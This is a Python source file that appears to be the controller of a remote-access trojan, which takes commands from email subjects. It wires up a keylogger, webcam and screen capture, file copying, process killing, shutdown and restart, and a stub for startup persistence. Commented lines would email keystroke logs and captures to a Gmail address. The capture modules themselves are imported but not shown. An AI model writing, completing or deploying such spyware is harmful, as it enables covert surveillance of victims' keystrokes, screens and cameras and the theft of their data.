
import os
from src.application import Application
from src.process import Process
from src.screen import Screen
from src.webcam import Webcam
from src.keylogger import KeyLogger
from src.fileSystem import FileSystem
from src.sender import Sender
from src.receiver import Receiver

class Main:
    def __init__(self):
        self.run = True
        self.s = Sender()
        self.r = Receiver()

    def check_mail(self):
        # based on the subject, and content, 
        # we will create some methods to check mail
        # Note: check the last email is read or unread 
        #           --> inscreasing the performance
        return self.r.get_recent_mail()
        # return [from, subject, content]

    def open(self):
        # receive message
        fr, sj, ct = self.check_mail()
        # fr - from
        # sj - subject
        # ct - content
        
        # need methods to split message or subject / body ...
        # blocks of code below are just an outline

        if sj == "process":
            self.process()
        elif sj == "screen":
            self.screen()
            # self.screen()
        elif sj == "webcam":
            self.webcam()
            # self.webcam()
        elif sj == "fileSystem":
            self.fileSystem()
            # self.fileSystem()
        elif sj == "registry":
            print()
            # self.registry()
        elif sj == "keylogger":
            self.keylogger()
        elif sj == "shutdown":
            self.shutdown()
        elif sj == "restart":
            self.restart()
        elif sj == "runFromStartup":
            self.runFromStartup()
        elif sj == "application":
            self.application()
        elif sj == "close":
            self.close()
        else:
            print('')
            # send a message to inform that the command was wrong

    def process(self):
        doit = Process()
        processes = doit.run(code='kill')
        print(processes)
        # self.s.send_mail("receiverimap002@gmail.com", 'process', processes)

    def screen(self):
        doit = Screen()
        doit.run(code='video')
        # load image/video 
        # self.s.send_mail("receiverimap002@gmail.com", 'screen', image/video)

    def webcam(self):
        doit = Webcam()
        doit.run(code='video')
        # load image/video
        # self.s.send_mail("receiverimap002@gmail.com", 'screen', image/video)

    def keylogger(self):
        doit = KeyLogger()
        log = doit.hook_in(Xtime=10)
        print(log)
        # self.s.send_mail("receiverimap002@gmail.com", 'screen', log)

    def fileSystem(self):
        doit = FileSystem()
        # tree = doit.getTree()
        doit.run(code='copy')
        # sent tree

    def shutdown(self):
        # send message 'shutdown, complete!'
        os.popen("shutdown /s")

    def runFromStartup(self):
        print('--registry?--')

    def application(self):
        doit = Application()
        apps = doit.run(code='kill')
        print(apps)

    def restart(self):
        # send message 'restart, complete!'
        os.popen("shutdown /r")

    def close(self):
        self.run = False
        # self.s.quit()
        # self.r.quit()

app = Main()
app.open()
# while app.run:
#     app.open()

